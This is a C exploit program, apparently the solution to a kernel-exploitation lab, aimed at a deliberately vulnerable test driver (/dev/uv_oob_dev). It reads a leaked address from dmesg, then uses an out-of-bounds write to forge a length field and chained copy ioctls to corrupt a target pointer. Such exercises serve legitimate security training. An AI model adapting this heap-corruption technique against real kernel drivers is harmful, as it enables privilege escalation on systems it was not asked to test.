#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE_PATH "/dev/uv_oob_dev"

#define IOCTL_MAGIC 'Y'
#define IOCTL_ALLOC_VULN _IOWR(IOCTL_MAGIC, 0x01, int)
#define IOCTL_FREE_VULN _IOW(IOCTL_MAGIC, 0x02, int)
#define IOCTL_WRITE_VULN _IOW(IOCTL_MAGIC, 0x03, int)
#define IOCTL_READ_VULN _IOR(IOCTL_MAGIC, 0x04, int)
#define IOCTL_ALLOC_ELS _IOWR(IOCTL_MAGIC, 0x05, int)
#define IOCTL_FREE_ELS _IOW(IOCTL_MAGIC, 0x06, int)
#define IOCTL_WRITE_ELS _IOW(IOCTL_MAGIC, 0x07, int)
#define IOCTL_READ_ELS _IOR(IOCTL_MAGIC, 0x08, int)
#define IOCTL_ALLOC_VICTIM _IOWR(IOCTL_MAGIC, 0x09, int)
#define IOCTL_FREE_VICTIM _IOW(IOCTL_MAGIC, 0x0A, int)
#define IOCTL_WRITE_VICTIM _IOW(IOCTL_MAGIC, 0x0B, int)
#define IOCTL_READ_VICTIM _IOR(IOCTL_MAGIC, 0x0C, int)
#define IOCTL_EXECUTE_VICTIM _IOW(IOCTL_MAGIC, 0x0D, int)
#define IOCTL_ALLOC_BRIDGE _IOWR(IOCTL_MAGIC, 0x0E, int)
#define IOCTL_FREE_BRIDGE _IOW(IOCTL_MAGIC, 0x0F, int)
#define IOCTL_COPY_BRIDGE _IOW(IOCTL_MAGIC, 0x10, int)
#define IOCTL_WRITE_ROUTER _IOW(IOCTL_MAGIC, 0x11, int)
#define IOCTL_READ_ROUTER _IOR(IOCTL_MAGIC, 0x12, int)
#define IOCTL_ALLOC_ROUTER _IOWR(IOCTL_MAGIC, 0x13, int)
#define IOCTL_FREE_ROUTER _IOW(IOCTL_MAGIC, 0x14, int)
#define IOCTL_COPY_ROUTER _IOW(IOCTL_MAGIC, 0x15, int)
#define IOCTL_SHOW_TARGET _IOR(IOCTL_MAGIC, 0x16, int)

struct request_arg {
  int handler;
  int offset;
  int length;
  char *value;
};

// 从 dmesg 日志中获取模块初始化时打印的 targetptr 地址
unsigned long get_target_addr() {
  FILE *fp = popen("dmesg | grep 'targetptr'", "r");
  if (!fp)
    return 0;
  char line[256];
  unsigned long addr = 0;
  while (fgets(line, sizeof(line), fp)) {
    char *p = strstr(line, "targetptr: 0x");
    if (p) {
      sscanf(p, "targetptr: 0x%lx", &addr);
    }
  }
  pclose(fp);
  return addr;
}

int main() {
  int fd;
  int router_handler;
  int msg_handler;
  int bridge_handler;
  int oob_handler;
  struct request_arg req;

  printf("[*] Bridge Router Exploit\n");

  // 0. 获取 targetptr 的内核地址
  unsigned long target_addr = get_target_addr();
  if (target_addr == 0) {
    printf("[-] Failed to find targetptr address from dmesg.\n");
    printf("[-] Ensure the module is loaded and dmesg has the address.\n");
    return -1;
  }
  printf("[+] Found targetptr address: 0x%lx\n", target_addr);

  fd = open(DEVICE_PATH, O_RDWR);
  if (fd < 0) {
    perror("[-] Failed to open the device");
    return -1;
  }
  printf("[+] Device opened successfully.\n");

  if (ioctl(fd, IOCTL_ALLOC_ROUTER, &router_handler) < 0) {
    perror("[-] Failed to allocate router");
    close(fd);
    return -1;
  }
  printf("[+] Router allocated with handler: %d\n", router_handler);

  if (ioctl(fd, IOCTL_ALLOC_VULN, &msg_handler) < 0) {
    perror("[-] Failed to allocate msg");
    close(fd);
    return -1;
  }
  printf("[+] Msg allocated with handler: %d\n", msg_handler);

  if (ioctl(fd, IOCTL_ALLOC_BRIDGE, &bridge_handler) < 0) {
    perror("[-] Failed to allocate bridge");
    close(fd);
    return -1;
  }
  printf("[+] Bridge allocated with handler: %d\n", bridge_handler);

  if (ioctl(fd, IOCTL_ALLOC_VULN, &oob_handler) < 0) {
    perror("[-] Failed to allocate oob");
    close(fd);
    return -1;
  }
  printf("[+] OOB allocated with handler: %d\n", oob_handler);

  req.handler = msg_handler;
  req.offset = 8;
  req.length = sizeof(target_addr);
  req.value = (char *)&target_addr;
  if (ioctl(fd, IOCTL_WRITE_VULN, &req) < 0) {
    perror("[-] Failed to write msg");
    close(fd);
    return -1;
  }
  printf("[+] Written targetptr address to msg buffer.\n");

  unsigned long fake_length = 520;
  req.handler = oob_handler;
  req.offset = 520;
  req.length = sizeof(int);
  req.value = (char *)&fake_length;
  if (ioctl(fd, IOCTL_WRITE_VULN, &req) < 0) {
    perror("[-] Failed to write OOB");
    close(fd);
    return -1;
  }
  printf("[+] Written fake length to OOB buffer.\n");

  if (ioctl(fd, IOCTL_COPY_BRIDGE, &bridge_handler) < 0) {
    perror("[-] Failed to copy bridge");
    close(fd);
    return -1;
  }
  printf("[+] Bridge copy executed.\n");

  if (ioctl(fd, IOCTL_COPY_ROUTER, &router_handler) < 0) {
    perror("[-] Failed to copy router");
    close(fd);
    return -1;
  }
  printf("[+] Router copy executed.\n");

  if (ioctl(fd, IOCTL_SHOW_TARGET) < 0) {
    perror("[-] Failed to show targetptr");
    close(fd);
    return -1;
  }
  printf("[+] Targetptr shown.\n");

  close(fd);
  return 0;
}